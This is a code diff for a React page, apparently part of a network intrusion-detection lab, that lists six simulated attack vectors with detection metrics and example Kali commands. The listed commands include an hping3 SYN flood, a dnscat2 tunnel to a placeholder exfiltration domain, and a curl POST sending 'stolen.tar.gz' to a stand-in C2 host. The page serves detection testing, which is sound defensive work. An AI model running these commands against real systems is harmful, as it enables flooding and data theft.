@@ -1,28 +1,38 @@
 'use client'
 import { useState, useEffect } from 'react'
-import { Skull, Target, Zap, Activity, Wifi, Radio, Upload, Play, CheckCircle2, Shield, RefreshCw, HelpCircle, BookOpen, Terminal, ChevronDown, ChevronUp, Lock, Cpu, FileCode, Server } from 'lucide-react'
+import { Skull, Target, Zap, Activity, Wifi, Radio, Upload, Play, CheckCircle2, Shield, RefreshCw, HelpCircle, BookOpen, Terminal, ChevronDown, ChevronUp, Lock, Cpu, FileCode, Server, Network } from 'lucide-react'
 import PacketFlowCanvas from '@/components/PacketFlowCanvas'
 
 const ATTACKS = [
   {
-    type: 'uni_directional', name: 'Unidirectional SYN Flood', icon: Wifi, color: 'red',
+    type: 'uni_directional', name: 'Volumetric SYN Flood (DDoS)', vector: 'VECTOR (a)', metric: 'SYN Asymmetry Ratio (R -> inf)', icon: Wifi, color: 'red',
     kali: 'hping3 -S -p 80 --flood',
     desc: 'Fires high-rate simplex SYN packets to blackholed targets with 0 SYN-ACK return packets.',
   },
   {
-    type: 'port_scan', name: 'Simplex Reconnaissance Scan', icon: Target, color: 'blue',
-    kali: 'nmap -sS -Pn -p 1-150',
-    desc: 'Simulates rapid sequential port probing (1-150) without waiting for response handshakes.',
+    type: 'c2_beacon', name: 'Botnet C2 Periodic Beaconing', vector: 'VECTOR (b)', metric: 'IAT Periodicity CV < 0.5', icon: Activity, color: 'purple',
+    kali: 'sliver-client beacon --interval 10s',
+    desc: 'Generates robotic periodic heartbeats with low Inter-Arrival Time variation (CV < 0.5).',
   },
   {
-    type: 'dga', name: 'Covert DGA & DNS Beaconing', icon: Activity, color: 'purple',
-    kali: 'dnscat2 / iodine covert channel',
+    type: 'dns_tunnel', name: 'Covert DGA & DNS Tunnelling', vector: 'VECTOR (c)', metric: 'Shannon Entropy H > 3.8', icon: Network, color: 'blue',
+    kali: 'dnscat2 --dns domain=exfil.covert.lab',
     desc: 'Transmits high-entropy domain queries to test covert channel and DGA detection over gateway.',
   },
   {
-    type: 'brute_force', name: 'Edge Service Brute Force', icon: Skull, color: 'orange',
-    kali: 'hydra -l admin -P wordlist ssh',
-    desc: 'Fires rapid bursts of authentication attempts directed into isolated service ports.',
+    type: 'tls_anomaly', name: 'Encrypted Session Malware', vector: 'VECTOR (d)', metric: 'Zero-Decryption JA3/JA4 Hash', icon: Lock, color: 'cyan',
+    kali: 'curl -k --tls-max 1.2 https://target:8443',
+    desc: 'Transmits TLS ClientHello frames with abnormal cipher metadata without payload decryption.',
+  },
+  {
+    type: 'port_scan', name: 'Simplex Reconnaissance Scan', vector: 'VECTOR (e)', metric: 'Port Fan-Out Cardinality > 20', icon: Target, color: 'orange',
+    kali: 'nmap -sS -Pn -p 1-150',
+    desc: 'Simulates rapid sequential port probing (1-150) across simplex tap without waiting for handshakes.',
+  },
+  {
+    type: 'exfiltration', name: 'Asymmetric Data Exfiltration', vector: 'VECTOR (f)', metric: 'Directional Volume Ratio > 10:1', icon: Skull, color: 'rose',
+    kali: 'curl -X POST -d @stolen.tar.gz http://c2:9000',
+    desc: 'Fires bulk outbound payload bursts with large volume asymmetry and zero return ACKs.',
   },
 ]
 
@@ -384,29 +394,40 @@ export default function ActionCenterPage() {
           </h3>
         </div>
 
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
           {ATTACKS.map((atk) => {
             const Icon = atk.icon
             return (
-              <div key={atk.type} className="rounded-xl border border-slate-800 bg-[#0c0f17] p-4 flex flex-col justify-between">
+              <div key={atk.type} className="rounded-xl border border-slate-800 bg-[#0c0f17] p-4 flex flex-col justify-between hover:border-slate-700 transition-all shadow-sm">
                 <div>
-                  <div className="p-2.5 rounded-lg bg-slate-800/40 w-fit mb-3 text-slate-300">
-                    <Icon className="w-5 h-5 text-blue-400" />
+                  <div className="flex items-center justify-between mb-2">
+                    <span className="text-[10px] font-bold font-mono px-2 py-0.5 rounded bg-blue-500/10 border border-blue-500/20 text-blue-400">
+                      {atk.vector}
+                    </span>
+                    <span className="text-[10px] font-mono text-slate-500">
+                      {atk.metric}
+                    </span>
                   </div>
-                  <h4 className="text-sm font-semibold text-white">{atk.name}</h4>
-                  <div className="my-1.5">
-                    <span className="text-[10px] font-mono bg-purple-950/40 text-purple-300 border border-purple-800/60 px-1.5 py-0.5 rounded">
+                  <div className="flex items-center gap-3 my-2">
+                    <div className="p-2 rounded-lg bg-slate-800/60 text-blue-400">
+                      <Icon className="w-5 h-5" />
+                    </div>
+                    <h4 className="text-sm font-semibold text-white">{atk.name}</h4>
+                  </div>
+                  <div className="my-2">
+                    <span className="text-[10px] font-mono bg-purple-950/40 text-purple-300 border border-purple-800/60 px-2 py-0.5 rounded block truncate">
                       Kali: {atk.kali}
                     </span>
                   </div>
-                  <p className="text-xs text-slate-400 mt-1 leading-relaxed">{atk.desc}</p>
+                  <p className="text-xs text-slate-400 leading-relaxed">{atk.desc}</p>
                 </div>
                 <button
                   onClick={() => triggerAttack(atk.type)}
                   disabled={loading !== null}
-                  className="mt-4 w-full py-1.5 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white rounded text-xs font-semibold transition-colors"
+                  className="mt-4 w-full py-2 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white rounded-lg text-xs font-bold font-mono transition-colors shadow flex items-center justify-center gap-2"
                 >
-                  {loading === atk.type ? 'Injecting Sockets...' : 'Inject Stream'}
+                  {loading === atk.type ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
+                  {loading === atk.type ? 'Injecting Sockets...' : 'Launch Simplex Probe'}
                 </button>
               </div>
             )
